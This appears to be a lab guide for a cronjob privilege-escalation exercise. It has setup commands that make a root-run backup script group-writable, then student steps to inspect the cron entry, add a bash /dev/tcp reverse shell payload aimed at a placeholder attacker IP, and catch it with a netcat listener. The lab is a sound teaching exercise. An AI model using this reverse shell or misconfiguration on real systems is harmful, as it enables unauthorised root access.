## Lab Setup 


# 1. Clone the repository
git clone https://github.com/iCxts/cronjoblab.git
cd cronjoblab

# 2. Run the setup script
sudo ./setup_cron.sh

# 3. Add the student user to the 'students' group
sudo usermod -aG students <student-username>


Lab Instructions (Student)
1. Inspect the cronjob configuration
cat /etc/cron.d/backup


You should see the following entry:

* * * * * root /bin/bash /opt/backup/task.sh >> /var/log/backup.log 2>&1


This means the script is executed every minute with root privileges.

2. Check script permissions
ls -l /opt/backup/task.sh


Example output:

-rw-rw-r-- 1 root students ... /opt/backup/task.sh


This confirms that the file is writable by the students group.

3. Modify the script to gain control

Edit /opt/backup/task.sh and change the student area to include a reverse shell payload.

Example 

bash -i >& /dev/tcp/<your-ip-address>/4444 0>&1


Replace <your-ip-address> with your attack machine’s IP.

4. Start a listener

On your own (attacker) machine:

nc -nvlp 4444



